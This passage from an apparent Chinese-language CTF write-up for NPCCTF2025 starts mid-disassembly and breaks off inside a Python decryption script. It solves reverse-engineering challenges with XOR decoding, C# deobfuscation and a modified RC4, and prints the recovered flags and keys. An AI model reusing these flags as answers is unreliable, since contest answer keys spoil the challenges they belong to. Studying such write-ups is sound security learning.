class="hljs-built_in">r12</span>+<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>00000000000016BD                 <span class="hljs-keyword">shl</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>00000000000016C1<br><span class="hljs-symbol">.text:</span>00000000000016C1 loc_16C1:                               <span class="hljs-comment">; CODE XREF: .text:00000000000016A6↑j</span><br><span class="hljs-symbol">.text:</span>00000000000016C1                 <span class="hljs-keyword">shr</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>00000000000016C4                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000016C6                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm1</span>, <span class="hljs-built_in">cs</span>:xmmword_2160<br><span class="hljs-symbol">.text:</span>00000000000016CE                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000016D0                 <span class="hljs-keyword">jbe</span>     loc_15A5<br><span class="hljs-symbol">.text:</span>00000000000016D6                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0Eh</span><br><span class="hljs-symbol">.text:</span>00000000000016D9                 <span class="hljs-keyword">jnz</span>     short loc_16F2<br><span class="hljs-symbol">.text:</span>00000000000016<span class="hljs-built_in">DB</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0FFFFFFFFh</span><br><span class="hljs-symbol">.text:</span>00000000000016DE                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>00000000000016E2                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rax</span>], <span class="hljs-built_in">dl</span><br><span class="hljs-symbol">.text:</span>00000000000016E6                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">65h</span><br><span class="hljs-symbol">.text:</span>00000000000016E9                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rax</span>+<span class="hljs-number">0</span>]<br><span class="hljs-symbol">.text:</span>00000000000016EF                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">ebx</span><br><span class="hljs-symbol">.text:</span>00000000000016F2<br><span class="hljs-symbol">.text:</span>00000000000016F2 loc_16F2:                               <span class="hljs-comment">; CODE XREF: .text:00000000000016D9↑j</span><br><span class="hljs-symbol">.text:</span>00000000000016F2                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rax</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">dl</span><br><span class="hljs-symbol">.text:</span>00000000000016F7<br><span class="hljs-symbol">.text:</span>00000000000016F7 loc_16F7:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001701↓j</span><br><span class="hljs-symbol">.text:</span>00000000000016F7                                         <span class="hljs-comment">; .text:0000000000001718↓j ...</span><br><span class="hljs-symbol">.text:</span>00000000000016F7                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">72h</span><br><span class="hljs-symbol">.text:</span>00000000000016FA                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>00000000000016FF                 <span class="hljs-keyword">cdqe</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001701</span>                 <span class="hljs-keyword">jle</span>     short loc_16F7<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001703</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001705</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">dil</span><br><span class="hljs-symbol">.text:</span>000000000000170A                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">72h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000170D</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001712</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">6</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001715</span>                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001718</span>                 <span class="hljs-keyword">jle</span>     short loc_16F7<br><span class="hljs-symbol">.text:</span>000000000000171A                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>000000000000171C                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">5</span>]<br><span class="hljs-symbol">.text:</span>000000000000171F                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">dil</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001724</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">72h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001727</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span>000000000000172C                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>000000000000172F                 <span class="hljs-keyword">jle</span>     short loc_16F7<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001731</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001733</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">4</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001736</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">dil</span><br><span class="hljs-symbol">.text:</span>000000000000173B                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">72h</span><br><span class="hljs-symbol">.text:</span>000000000000173E                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001743</span>                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001746</span>                 <span class="hljs-keyword">jle</span>     short loc_16F7<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001748</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>000000000000174A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">3</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000174D</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">dil</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001752</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">72h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001755</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span>000000000000175A                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000175D</span>                 <span class="hljs-keyword">jle</span>     short loc_16F7<br><span class="hljs-symbol">.text:</span>000000000000175F                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001761</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">2</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001764</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">dil</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001769</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">72h</span><br><span class="hljs-symbol">.text:</span>000000000000176C                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001771</span>                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001774</span>                 <span class="hljs-keyword">jle</span>     short loc_16F7<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001776</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001778</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span>000000000000177B                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">dl</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001780</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">72h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001783</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rdi</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001788</span>                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>000000000000178B                 <span class="hljs-keyword">jz</span>      loc_16F7<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001791</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001791</span> loc_1791:                               <span class="hljs-comment">; CODE XREF: .text:00000000000017B4↓j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001791</span>                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">7</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001794</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001796</span>                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">0FFFFFFF8h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001799</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edi</span><br><span class="hljs-symbol">.text:</span>000000000000179B                 <span class="hljs-keyword">movq</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000017A2                 <span class="hljs-keyword">pxor</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm1</span><br><span class="hljs-symbol">.text:</span>00000000000017A6                 <span class="hljs-keyword">movq</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span>00000000000017AC                 <span class="hljs-keyword">movq</span>    <span class="hljs-built_in">xmm1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:xmmword_2150<br><span class="hljs-symbol">.text:</span>00000000000017B4                 <span class="hljs-keyword">jbe</span>     short loc_1791<br><span class="hljs-symbol">.text:</span>00000000000017B6                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">r8d</span>, <span class="hljs-number">6</span><br><span class="hljs-symbol">.text:</span>00000000000017BA                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">r8d</span>, [<span class="hljs-built_in">rdi</span>-<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span>00000000000017BE                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>00000000000017C0                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000017C2                 <span class="hljs-keyword">jz</span>      loc_16F7<br><span class="hljs-symbol">.text:</span>00000000000017C8<br><span class="hljs-symbol">.text:</span>00000000000017C8 loc_17C8:                               <span class="hljs-comment">; CODE XREF: .text:00000000000015A0↑j</span><br><span class="hljs-symbol">.text:</span>00000000000017C8                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000017CA                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000017CC                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0FFFFFFF0h</span><br><span class="hljs-symbol">.text:</span>00000000000017CF                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000017D1                 <span class="hljs-keyword">jnz</span>     short loc_17EE<br><span class="hljs-symbol">.text:</span>00000000000017D3                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span>00000000000017D6                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span>00000000000017DA                 <span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r13</span>+<span class="hljs-built_in">rax</span>+<span class="hljs-number">0</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000017E0                 <span class="hljs-keyword">pxor</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm1</span><br><span class="hljs-symbol">.text:</span>00000000000017E4                 <span class="hljs-keyword">movdqu</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r14</span>+<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>00000000000017EA                 <span class="hljs-keyword">shl</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>00000000000017EE<br><span class="hljs-symbol">.text:</span>00000000000017EE loc_17EE:                               <span class="hljs-comment">; CODE XREF: .text:00000000000017D1↑j</span><br><span class="hljs-symbol">.text:</span>00000000000017EE                 <span class="hljs-keyword">shr</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>00000000000017F1                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000017F3                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm1</span>, <span class="hljs-built_in">cs</span>:xmmword_2150<br><span class="hljs-symbol">.text:</span>00000000000017FB                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000017FD                 <span class="hljs-keyword">jbe</span>     loc_15AE<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001803</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0Eh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001806</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">esi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001809</span>                 <span class="hljs-keyword">jz</span>      loc_15D7<br><span class="hljs-symbol">.text:</span>000000000000180F                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001811</span>                 <span class="hljs-keyword">jz</span>      loc_159C<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001817</span>                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>000000000000181A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000181D</span>                 <span class="hljs-keyword">call</span>    _malloc<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001822</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001825</span>                 <span class="hljs-keyword">jz</span>      loc_159C<br><span class="hljs-symbol">.text:</span>000000000000182B                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>000000000000182E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001831</span>                 <span class="hljs-keyword">call</span>    _malloc<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001836</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001839</span>                 <span class="hljs-keyword">jz</span>      loc_159C<br><span class="hljs-symbol">.text:</span>000000000000183F                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001842</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001845</span>                 <span class="hljs-keyword">call</span>    _malloc<br><span class="hljs-symbol">.text:</span>000000000000184A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000184D</span>                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">r15</span>, <span class="hljs-built_in">r15d</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001850</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001850</span> loc_1850:                               <span class="hljs-comment">; CODE XREF: .text:00000000000015A9↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001850</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">r15d</span>, [<span class="hljs-built_in">rbx</span>+<span class="hljs-number">2</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001854</span>                 <span class="hljs-keyword">jnz</span>     short loc_1865<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001856</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>-<span class="hljs-number">1</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000000185A                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000185D</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>000000000000185F                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001863</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001865</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001865</span> loc_1865:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001854↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001865</span>                 <span class="hljs-keyword">jz</span>      loc_15BC<br><span class="hljs-symbol">.text:</span>000000000000186B                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000000186E                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001872</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001873</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001874</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001876</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001878</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>000000000000187B                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000187D</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001881</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001883</span>                 <span class="hljs-keyword">jz</span>      loc_1595<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001889</span>                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>000000000000188C                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span><br></code></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>用密文异或 0x76 和 0x72 之后没得到可见明文字符，爆破出来第三个异或值是 <strong>0x65</strong>(后来在汇编中异或 0x76 和 异或 0x72 之间的部分看到有一个异或 0x65)</p><p><img src="/../images/NPCCTF2025/r2.png"></p><p>得到 <code>r&#125;v3r33$u__p$1d_w0&#123;nagfl</code>,可以看出这个是从后往前两个字符一组交换顺序，整理出来 flag 是<br><code>flag&#123;nw0d_$1_pu_3$r3v3r&#125;</code></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>做题的时候就很好奇，为什么汇编是反着的，但是程序却能正常运行，解惑参考<a href="https://blog.maxxsoft.net/index.php/archives/146/">这篇文章</a></p><h3 id="cccc"><a href="#cccc" class="headerlink" title="cccc"></a>cccc</h3><h4 id="处理混淆"><a href="#处理混淆" class="headerlink" title="处理混淆"></a>处理混淆</h4><p>C# 逆向，动调之后基本能确定主要逻辑在 dll 中，被confuser 混淆了，先用 <strong>de4dot</strong> 去一下混淆</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">D</span>:\CTF\Reverse\de4dot-Reactor5<span class="hljs-number">.0</span>&gt;de4dot.exe <span class="hljs-name">D</span>:\aaa\NPCCTF\cccc\ccccapp.dll<br>Detected Unknown Obfuscator (<span class="hljs-name">D</span>:\aaa\NPCCTF\cccc\ccccapp.dll)<br>Cleaning <span class="hljs-name">D</span>:\aaa\NPCCTF\cccc\ccccapp.dll<br>Renaming all obfuscated symbols<br>Saving <span class="hljs-name">D</span>:\aaa\NPCCTF\cccc\ccccapp-cleaned.dll<br></code></pre></td></tr></table></figure><p>然后用 <strong>dnSpy</strong> 打开，发现关键类</p><p><img src="/../images/NPCCTF2025/c1.png"></p><p>可以看到它读取了输入之后进行了一系列操作，后面的数据应该是密文了</p><p>动调找程序逻辑，我最开始直接调试会报错，后面设置成这样就能调了(选中使用宿主可执行文件)</p><p><img src="/../images/NPCCTF2025/c2.png"></p><h4 id="动调梳理"><a href="#动调梳理" class="headerlink" title="动调梳理"></a>动调梳理</h4><p>逐语句(F11) 一直调<br>到达用户输入的地方</p><p><img src="/../images/NPCCTF2025/c3.png"></p><p>这里在读取输入</p><p><img src="/../images/NPCCTF2025/c4.png"></p><p>找到一串字符 <code>doyouknowcsharp</code>,和输入的内容传入同一个函数，推测这个字符串应该是密钥</p><p><img src="/../images/NPCCTF2025/c5.png"></p><p>找到加密逻辑，魔改 RC4，<code>array2[t3] = (byte)(A_1[t3] ^ array[(array[t] + array[t2]) % 256] ^ 100);</code> 这部分多了一个<strong>异或 100</strong></p><p><img src="/../images/NPCCTF2025/c6.png"></p><p>再往后就是比较完输出 Wrong</p><h4 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_cccc_dec</span>(<span class="hljs-params">cipher,key_str</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    key = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key_str]<br><br>    <span class="hljs-keyword">for</span> i <span 